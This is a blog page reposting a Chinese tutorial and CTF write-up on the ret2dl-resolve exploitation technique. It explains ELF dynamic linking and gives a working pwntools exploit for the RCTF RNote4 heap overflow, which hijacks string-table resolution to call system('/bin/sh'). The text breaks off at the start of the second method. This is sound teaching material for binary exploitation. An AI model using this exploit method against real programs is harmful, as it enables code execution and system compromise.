<!DOCTYPE html>





<html lang="">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">

<link rel="stylesheet" href="/css/main.css?v=7.4.0">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.4.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: 'search.xml',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Copy',
      copy_success: 'Copied',
      copy_failure: 'Copy failed'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="ret2dl-resolve详解转载自看雪论坛，原文：https://bbs.pediy.com/thread-227034.htm 0x00 前言最近做RCTF，结果pwn一道没做出来（虽然精力全放在更擅长的reverse上了），然后复盘的时候发现RNote4有个关于ret2dl-resolve的利用，遂在网上查之，发现很多资料讲的不是很清楚，但是还是慢慢琢磨弄懂了。这个技巧貌似是一个挺基础的技">
<meta property="og:type" content="article">
<meta property="og:title" content="ret2dl-resolve详解">
<meta property="og:url" content="http://yoursite.com/2019/10/07/ret2dl-resolve╧Ω╜Γ/index.html">
<meta property="og:site_name" content="ZERO-A-ONE">
<meta property="og:description" content="ret2dl-resolve详解转载自看雪论坛，原文：https://bbs.pediy.com/thread-227034.htm 0x00 前言最近做RCTF，结果pwn一道没做出来（虽然精力全放在更擅长的reverse上了），然后复盘的时候发现RNote4有个关于ret2dl-resolve的利用，遂在网上查之，发现很多资料讲的不是很清楚，但是还是慢慢琢磨弄懂了。这个技巧貌似是一个挺基础的技">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_T4GWFF2PV36ZNX8.png.jpg">
<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_UH6SD6XJVZW7T24.png.jpg">
<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_YBW9WNCFG6ARTBN.png.jpg">
<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_NQJC7WN7V477NFU.png.jpg">
<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_MBHEB59H58HGWSJ.png.jpg">
<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_YVAWY7X8YES3MCB.png.jpg">
<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_GP7F2G76BJHTFAX.png.jpg">
<meta property="og:updated_time" content="2019-10-08T08:03:04.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ret2dl-resolve详解">
<meta name="twitter:description" content="ret2dl-resolve详解转载自看雪论坛，原文：https://bbs.pediy.com/thread-227034.htm 0x00 前言最近做RCTF，结果pwn一道没做出来（虽然精力全放在更擅长的reverse上了），然后复盘的时候发现RNote4有个关于ret2dl-resolve的利用，遂在网上查之，发现很多资料讲的不是很清楚，但是还是慢慢琢磨弄懂了。这个技巧貌似是一个挺基础的技">
<meta name="twitter:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_T4GWFF2PV36ZNX8.png.jpg">
  <link rel="canonical" href="http://yoursite.com/2019/10/07/ret2dl-resolve╧Ω╜Γ/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: false,
    isPost: true,
    isPage: false,
    isArchive: false
  };
</script>

  <title>ret2dl-resolve详解 | ZERO-A-ONE</title>
  








  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">
  <div class="container use-motion">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ZERO-A-ONE</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
      
      
      
        
        <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
      
      
      
        
        <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a href="javascript:;" class="popup-trigger">
        
          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
      </li>
    
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="none"
           placeholder="Searching..." spellcheck="false"
           type="text" id="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
            

          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
     <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block post">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/07/ret2dl-resolve╧Ω╜Γ/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">ret2dl-resolve详解

          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-10-07 09:46:50" itemprop="dateCreated datePublished" datetime="2019-10-07T09:46:50-07:00">2019-10-07</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-08 01:03:04" itemprop="dateModified" datetime="2019-10-08T01:03:04-07:00">2019-10-08</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="ret2dl-resolve详解"><a href="#ret2dl-resolve详解" class="headerlink" title="ret2dl-resolve详解"></a>ret2dl-resolve详解</h1><p>转载自看雪论坛，原文：<a href="https://bbs.pediy.com/thread-227034.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-227034.htm</a></p>
<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近做RCTF，结果pwn一道没做出来（虽然精力全放在更擅长的reverse上了），然后复盘的时候发现RNote4有个关于ret2dl-resolve的利用，遂在网上查之，发现很多资料讲的不是很清楚，但是还是慢慢琢磨弄懂了。这个技巧貌似是一个挺基础的技巧，玩pwn一段时间了，发现自己还有这种知识遗漏。。。所以这篇文章新手向，大神可以绕道了。。。。</p>
<h1 id="0x01-ELF文件格式以及动态链接"><a href="#0x01-ELF文件格式以及动态链接" class="headerlink" title="0x01 ELF文件格式以及动态链接"></a>0x01 ELF文件格式以及动态链接</h1><p>我们知道，无论是windows下还是linux下，程序想要调用其他动态链接库的函数，必须要在程序加载的时候动态链接，比方说，windows下，叫作IAT表，linux下，叫作GOT表。调用库函数时，会有个类似call  [xxx] 或者 jmp  [xxx]的指令，其中xxx是IAT表或者GOT表的地址。在这里因为是linux的pwn，我们主要讨论GOT表，以及在linux下更为常见的jmp  [xxx].</p>
<h2 id="linux如何调用库函数"><a href="#linux如何调用库函数" class="headerlink" title="linux如何调用库函数"></a>linux如何调用库函数</h2><p>首先一个hello world程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hello Pwn\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//gcc -m32 -fno-stack-protector -no-pie -s hellopwn.c</span></span><br></pre></td></tr></table></figure>

<p>其中，这个puts是调用的libc这个动态链接库导出的一个函数。编译它，看看puts是怎么被调用的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push    offset s        ; <span class="string">"Hello Pwn\n"</span></span><br><span class="line">call    _puts ;这里调用<span class="built_in">puts</span></span><br><span class="line">_puts:</span><br><span class="line">jmp     ds:off_804A00C ; <span class="built_in">puts</span>会call到这里，这里就是“jmp [GOT表地址]”的这样一条指令</span><br></pre></td></tr></table></figure>

<p>跟一下，看看这个off_804A00C在<strong>第一次调用</strong>时是什么东西</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_T4GWFF2PV36ZNX8.png.jpg" alt="img"></p>
<p>可以发现，是0x80482e6这个地址，并不直接是libc的puts函数的地址。这是因为linux在程序加载时使用了延迟绑定(lazy  load)，只有等到这个函数被调用了，才去把这个函数在libc的地址放到GOT表中。接下来，会再push一个0，再push一个dword  ptr  [0x804a004]，待会会说这两个参数是什么意思，最后跳到libc的_dl_runtime_resolve去执行。这个函数的目的，是根据2个参数获取到导出函数（这里是puts）的地址，然后放到相应的GOT表，并且调用它。而这个函数的地址也是从GOT表取并且jmp  [xxx]过去的，但是这个函数不会延迟绑定，因为所有函数都是用它做的延迟绑定，如果把它也延迟绑定就会出现先有鸡还是先有蛋的问题了。</p>
<h2 id="ELF关于动态链接的一些关键section"><a href="#ELF关于动态链接的一些关键section" class="headerlink" title="ELF关于动态链接的一些关键section"></a>ELF关于动态链接的一些关键section</h2><p>section，segment是什么东西不说了，不知道的话呢谷歌百度一下</p>
<h3 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h3><p>包含了一些关于动态链接的关键信息，在这个hellopwn上它长这样，事实上这个section所有程序都差不多</p>
<p> <img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_UH6SD6XJVZW7T24.png.jpg" alt="img"></p>
<p>这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针，可以<code>readelf -S hellopwn</code>看一下，会发现这三个section的地址跟在上图所示的地址是一样的。</p>
<h3 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_YBW9WNCFG6ARTBN.png.jpg" alt="img"></p>
<p>一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个puts。到时候，相关数据结构引用一个字符串时，用的是<strong>相对这个section头的偏移</strong>，比方说，在这里，就是字符串相对0x804821C的偏移。</p>
<h3 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_NQJC7WN7V477NFU.png.jpg" alt="img"></p>
<p>这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。结构体定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure>

<h3 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_MBHEB59H58HGWSJ.png.jpg" alt="img"></p>
<p>这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Addr    r_offset; //指向GOT表的指针</span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span><br><span class="line">  //1和3是这个导入函数的符号在.dynsym中的下标，</span><br><span class="line">  //如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>

<h2 id="dl-runtime-resolve做了什么"><a href="#dl-runtime-resolve做了什么" class="headerlink" title="_dl_runtime_resolve做了什么"></a>_dl_runtime_resolve做了什么</h2><p>这个想要深入理解的话呢可以去看<code>glibc/elf/dl-runtime.c</code>的源码，这里我就不贴了，因为有一堆宏，看着让人晕，我就直接说下他做了哪些事情。</p>
<p>首先说第一个参数，[0x804a004]是一个<code>link_map</code>的指针，这个结构是干什么的，我们不关心，但是有一点要知道，它包含了<code>.dynamic</code>的指针，通过这个<code>link_map</code>，<code>_dl_runtime_resolve</code>函数可以访问到<code>.dynamic</code>这个section</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_YVAWY7X8YES3MCB.png.jpg" alt="img"></p>
<p>0x08049f14是<code>.dynamic</code>的指针，与前面图中一致；而第二个参数，是当前要调用的导入函数在<code>.rel.plt</code>中的偏移（不过64位的话就直接是index下标），比方说这里，puts就是0，<code>__libc_start_main</code>就是<code>1*sizeof(Elf32_Rel)=8</code>。</p>
<h3 id="dl-runtime-resolve会"><a href="#dl-runtime-resolve会" class="headerlink" title="_dl_runtime_resolve会"></a>_dl_runtime_resolve会</h3><ol>
<li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li>
<li><code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li>
<li><code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li>
<li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li>
<li>调用这个函数</li>
</ol>
<p>如果阅读libc源码的话会发现实际顺序可能跟我上面所说的有一点偏差，不过意思都一样，我这样说会比较好理解。</p>
<h1 id="0x02-ret2dl-resolve-利用"><a href="#0x02-ret2dl-resolve-利用" class="headerlink" title="0x02 ret2dl-resolve 利用"></a>0x02 ret2dl-resolve 利用</h1><p>那么，这个怎么去利用呢，有两种利用方式</p>
<h2 id="改写-dynamic的DT-STRTAB"><a href="#改写-dynamic的DT-STRTAB" class="headerlink" title="改写.dynamic的DT_STRTAB"></a>改写.dynamic的DT_STRTAB</h2><p>这个只有在checksec时<code>No RELRO</code>可行，即<code>.dynamic</code>可写。因为<code>ret2dl-resolve</code>会从<code>.dynamic</code>里面拿<code>.dynstr</code>字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够<strong>改写</strong>这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。比方说，原本是一个<code>free</code>函数，我们就把原本是<code>free</code>字符串的那个偏移位置设为<code>system</code>字符串，<strong>第一次</strong>调用<code>free(&quot;bin/sh&quot;)</code>（因为只有第一次才会resolve），就等于调用了<code>system(&quot;/bin/sh&quot;)</code>。</p>
<p>例题就是RCTF的RNote4，题目是一道堆溢出，<code>NO RELRO</code>而且<code>NO PIE</code>溢出到后面的指针可以实现任意地址写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 a1; <span class="comment">// [rsp+Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  a1 = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;a1, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !notes[a1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3 = notes[a1];</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);                      <span class="comment">// heap overflow堆溢出</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( number &gt; <span class="number">32</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  v3 = (note *)<span class="built_in">calloc</span>(<span class="number">0x10</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3-&gt;buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1u</span>LL); <span class="comment">//堆中存放了指针，所以可以通过这个任意写</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3-&gt;buf )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);</span><br><span class="line">  v3-&gt;size = size;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; notes[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  notes[i] = v3;</span><br><span class="line">  ++number;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以呢，可以先add两个note，然后编辑第一个note使得堆溢出到第二个note的指针，然后再修改第二个note，实现任意写。至于写什么，刚刚也说了，先写<code>.dynamic</code>指向字符串表的指针，使其指向一块可写内存，比如<code>.bss</code>，然后再写这块内存，使得相应偏移出刚好有个<code>system\x00</code>。exp如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">g_local=True</span><br><span class="line">#e=ELF('./libc.so.6')</span><br><span class="line">#context.log_level='debug'</span><br><span class="line"><span class="keyword">if</span> g_local:</span><br><span class="line">    sh =process('./RNote4')#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">"rnote4.2018.teamrois.cn"</span>, <span class="number">6767</span>)</span><br><span class="line"> </span><br><span class="line">def add(content):</span><br><span class="line">    assert len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x01"</span>)</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line">def edit(idx, content):</span><br><span class="line">    assert idx &lt; <span class="number">32</span> <span class="keyword">and</span> len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x02"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line">def <span class="keyword">delete</span>(idx):</span><br><span class="line">    assert idx &lt; <span class="number">32</span></span><br><span class="line">    sh.send(<span class="string">"\x03"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line"> </span><br><span class="line">#伪造的字符串表，(<span class="number">0x457</span><span class="number">-0x3f8</span>)刚好是<span class="string">"free\x00"</span>字符串的偏移</span><br><span class="line">payload = <span class="string">"C"</span> * (<span class="number">0x457</span><span class="number">-0x3f8</span>) + <span class="string">"system\x00"</span></span><br><span class="line">#先新建两个notes</span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"B"</span> * <span class="number">0x10</span>)</span><br><span class="line">#溢出时尽量保证堆块不被破坏，不过这里不会再做堆的操作了其实也无所谓</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x601EB0</span>))</span><br><span class="line">#将<span class="number">0x601EB0</span>，即.dynamic的字符串表指针，写成<span class="number">0x6020C8</span></span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0x6020C8</span>))</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x6020C8</span>))</span><br><span class="line">#在<span class="number">0x6020C8</span>处写入伪造的字符串表</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"> </span><br><span class="line">#会第一次调用<span class="built_in">free</span>，所以实际上是system(<span class="string">"/bin/sh"</span>)被调用，如前面所说</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="操纵第二个参数，使其指向我们所构造的Elf32-Rel"><a href="#操纵第二个参数，使其指向我们所构造的Elf32-Rel" class="headerlink" title="操纵第二个参数，使其指向我们所构造的Elf32_Rel"></a>操纵第二个参数，使其指向我们所构造的Elf32_Rel</h2><p>如果<code>.dynamic</code>不可写，那么以上方法就没用了，所以有第二种利用方法。要知道，前面的<code>_dl_runtime_resolve</code>在第二步时</p>
<blockquote>
